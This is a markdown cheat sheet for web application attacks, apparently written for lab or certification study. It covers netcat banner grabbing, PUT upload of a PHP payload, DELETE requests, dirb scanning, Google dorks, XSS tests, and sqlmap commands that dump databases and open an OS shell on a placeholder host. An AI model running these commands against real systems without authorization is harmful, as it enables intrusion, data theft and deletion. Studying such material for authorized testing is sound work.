---
description: Web application vulns and exploits
---

# Web Attacks

## Banner grabbing

### Netcat \(for HTTP services\) <a id="netcat-for-http-services"></a>

```text
nc -v 10.10.10.10 port
HEAD / HTTP/1.0
```

### OpenSSL \(for HTTPS services\) <a id="openssl-for-https-services"></a>

```text
openssl s_client -connect 10.10.10.10:443
HEAD / HTTP/1.0
```

### Httprint <a id="httprint"></a>

```text
httprint -P0 -h 10.10.10.10 -s /usr/share/httprint/signatures.txt
```

## HTTP Verbs <a id="http-verbs"></a>

`GET, POST, HEAD, PUT, DELETE`

### PUT is used to upload a file to the server <a id="put-is-used-to-upload-a-file-to-the-server"></a>

You have to find the size of the file you are uploading first

```text
wc -m payload.php
[size] payload.php
```

```text
nc 10.10.10.10 80
PUT /payload.php
Content-type: text/html
Content-length: [size]

```

### DELETE is used to delete a file from the server <a id="delete-is-used-to-delete-a-file-from-the-server"></a>

```text
nc 10.10.10.10 80
DELETE /path/to/file.txt / HTTP/1.0
```

### OPTIONS is used to query the webserver for enabled HTTP Verbs <a id="options-is-used-to-query-the-webserver-for-enabled-http-verbs"></a>

```text
nc 10.10.10.10 80
OPTIONS / HTTP/1.0
```

## Directory and File scanning <a id="directory-and-file-scanning"></a>

### Dirbuster <a id="dirbuster"></a>

![Dirbuster](https://gblobscdn.gitbook.com/assets%2F-M_9npUfU_wpKvUX_GaB%2F-MagR4YPOWTFD_15vHvL%2F-MahfUhT53l7HHnpBBge%2Fdirbuster.png?alt=media&token=61b8043d-946f-4850-884f-0fb38c3ae4d7)

### dirb <a id="dirb"></a>

```text
dirb http://10.10.10.10/
```

**If Webpage is authenticated**

```text
dirb http://10.10.10.10/ -u <username>:<password>
```

1. You can choose different wordlists for the dictionary brute force but from my experience in most labs you can find them in the `common.txt`
2. You can also choose different extensions but _`php`_ and _`bak`_ will be the most useful ones to find.
3. If there is HTTP authentication or login of some other kind for the webpage you can set the creds using \[Options -&gt; Advanced Options -&gt; Authentication options\]
4. The con with Dirbuster is that it sometimes freezes which is a real bummer otherwise it's real good.

## Google Dorks <a id="google-dorks"></a>

`site:   
intitle:   
inurl:   
filetype:   
AND, OR & |   
-`

​[GHDB](https://www.exploit-db.com/google-hacking-database) for more resources.

## XSS \(Cross-Site Scripting\) <a id="xss-cross-site-scripting"></a>

1. Find a reflection point
2. Test with HTML tag \(&lt;h1&gt;Test&lt;/h1&gt;\)
3. Test with JS code \[alert\('XSS'\)\]

XSS filter bypass cheatsheet: [OWASP cheatsheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)​

**Reflected XSS**: Payload is carried inside the request the victim sends to the website. Typically the link contains the malicious payload.

**Persistent XSS**: Payload remains in the site that multiple users can fall victim to. Typically embedded via a form or forum post.

## SQL Injections <a id="sql-injections"></a>

### GET <a id="get"></a>

```text
sqlmap -u 'http://10.10.10.10/search.php?id=123' -p id
```

```text
sqlmap -u 'http://10.10.10.10/search.php?id=123' -p id --technique=U
```

### Database USER <a id="database-user"></a>

```text
sqlmap -u 'http://10.10.10.10/search.php?id=123' -p id --technique=U --user
```

### Databases <a id="databases"></a>

```text
sqlmap -u 'http://10.10.10.10/search.php?id=123' -p id --technique=U --dbs
```

### Dump all <a id="dump-all"></a>

```text
sqlmap -u 'http://10.10.10.10/search.php?id=123' -p id --technique=U --dump
```

### POST <a id="post"></a>

Find the parameters that are being passed in POST using BurpSuite.   
E.g: **`username=some&password=thing`** where the parameter username is vulnerable.

```text
sqlmap -u 'http://10.10.10.10/login.php' --data='username=some&password=thing' -p username --technique=B
```

**The Databases, Users and dump-all switches are the same as for the GET parameter.**

If you aren't able to deduce which parameter is vulnerable in POST, you can drop the -p switch. SQLMAP will try to test them and find them on its own so don't sweat it and also for most of the prompts use the default options\(i.e. just press enter\).

The --technique switch is to create less noise and prevent the service from shutting down due to query overload. If the given techniques do not work try it removing the switch.

### OS-Shell <a id="os-shell"></a>

```text
sqlmap -u "http://10.10.10.10/login.php" --os-shell
```

### SQL-Shell <a id="sql-shell"></a>

```text
sqlmap -u "http://10.10.10.10/login.php" --sql-shell
```

